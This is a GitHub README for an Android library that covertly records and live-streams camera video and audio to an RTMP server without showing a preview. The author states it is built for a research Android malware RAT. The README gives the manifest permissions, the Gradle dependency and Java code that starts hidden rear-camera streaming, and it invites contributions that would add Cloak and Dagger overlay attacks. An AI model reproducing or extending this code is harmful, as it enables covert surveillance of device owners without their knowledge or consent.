
# Live Hidden Camera

Live Hidden Camera (LHC) is a library which record live video and audio from Android device without displaying a preview.
![Live Hidden Camera](https://github.com/mirsamantajbakhsh/LiveHiddenCamera/raw/master/ScreenShots/Live%20Hidden%20Camera.gif)

## Motivation
I'm working on a research based Android Malware and decided to create a multi function RAT (Remote Administration Tool). I was working on Live Streams which I've found some RTMP based open sources projects including:

 - https://github.com/begeekmyfriend/yasea
 - https://github.com/ant-media/LiveVideoBroadcaster
 - https://github.com/TakuSemba/RtmpPublisher
 - https://github.com/fyhertz/libstreaming
which, all have some kind of problems based on the requirements of a RAT. But the common one was that they all need an activity to include a `SurfaceView`.

Therefore, I've started searching. Finally, I could create **Live Hidden Camera** which only needs a **CONTEXT** for stream live video, by combining these two projects:

 1. https://github.com/begeekmyfriend/yasea
 2. https://github.com/kevalpatel2106/android-hidden-camera

# How to use
I've created a library to make it more usable. The only requirement is to add the library to your project and pass the Rtmp URL to it.

Additionally you should care about:

 1. Your application should have the following permissions in `Manifest.xml`:
 ```
<uses-permission android:name="android.permission.INTERNET" />  
<uses-permission android:name="android.permission.CAMERA" />  
<uses-permission android:name="android.permission.RECORD_AUDIO" />  
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
```

 2. You should handle that the declared permissions are granted to your application

<img src="https://github.com/mirsamantajbakhsh/LiveHiddenCamera/raw/master/ScreenShots/Permissions1.png" width="250">
<img src="https://github.com/mirsamantajbakhsh/LiveHiddenCamera/raw/master/ScreenShots/Permissions2.png" width="250">

## Adding library
The usage of the library is straight. Just add the following library to the `gradle.build` file of your project.

`compile 'ir.mstajbakhsh.android:LiveHiddenCamera:0.1.1'`

- Update: In the previouls release, Main Activity with Launcher filter was in library, which made the application (that uses the library), had two icons. **In this release, the filter is commented in `Manifest`**.

## Creating RTMP server
Before using the library, you should have deployed an Rtmp server. I've ued [Ant Media Server](https://github.com/ant-media/Ant-Media-Server). There is a nice guide on Ant Media Server installation in [THIS LINK](https://github.com/ant-media/Ant-Media-Server/wiki/Getting-Started).

After starting the Ant Media Rtmp server, you should see something like this:
![Ant Media Server](https://github.com/mirsamantajbakhsh/LiveHiddenCamera/raw/master/ScreenShots/AntMediaServer.png)

## Sample Code
After adding the library to your project, do the following steps:

 1. Create a class which implements: `RtmpHandler.RtmpListener, SrsRecordHandler.SrsRecordListener, SrsEncodeHandler.SrsEncodeListener`
 2. Create two fields (one for publish and one for preview): 

    private SrsPublisher mPublisher;  
    private SrsCameraView mCameraView;

 3. Implement a function for starting the Live Hidden Camera:
 
```Java
    private void initHiddenCam(String rtmpURL) {  
    HiddenCameraLayout l = new HiddenCameraLayout(getApplicationContext(), new HiddenCameraLayout.PermissionHandler() {  
        @Override  
  public void onPermissionNotGrantedException(Exception ex) {  
            Log.d("HCL", "Ask user to grant permission.");  
            Log.e("HCL", ex.getMessage());  
        }  
    });  
  
    //start config  
  CameraConfig cameraConfig = new CameraConfig()  
            .getBuilder(MainActivity.this.getApplicationContext())  
            .setCameraFacing(CameraFacing.REAR_FACING_CAMERA)  
            .build();  
  
  
    mCameraView = l.initHiddenLayout(cameraConfig);  
  
    mPublisher = new SrsPublisher(mCameraView);  
    mPublisher.setEncodeHandler(new SrsEncodeHandler(this));  
    mPublisher.setRtmpHandler(new RtmpHandler(this));  
    mPublisher.setRecordHandler(new SrsRecordHandler(this));  
    mPublisher.setPreviewResolution(640, 360);  
    mPublisher.setOutputResolution(640, 360);  
    mPublisher.setVideoHDMode();  
    mPublisher.startPublish(rtmpURL);  
    mPublisher.startCamera();  
}
```

# Problems
## Green Screen
The main problem I currently facing, is the green screen. I've described the error in StackOverflow in https://stackoverflow.com/questions/56380851/getting-green-image-while-preview-hidden-live-video

If you have any suggestion about this problem, or any other idea, do not hesitate contacting me.

## Constant View
Because of the overlay of the Live Hidden Camera, no other apps can be clicked. The clicks are only accepted by the LHC. Check **TODO** section.

# TODO
There is a project called *Cloak and Dagger* which unraveled a very dangerous ability in Android. Any contribution in using the *Cloack and Dagger* in LHC is welcomed.

Check the *Cloak and Dagger* here:

 1. http://cloak-and-dagger.org
 2. https://medium.com/@targetpractice/cloak-and-dagger-malware-techniques-demystified-c4d8a035b94e
 
# Contact
You can reach me from my website: https://mstajbakhsh.ir/
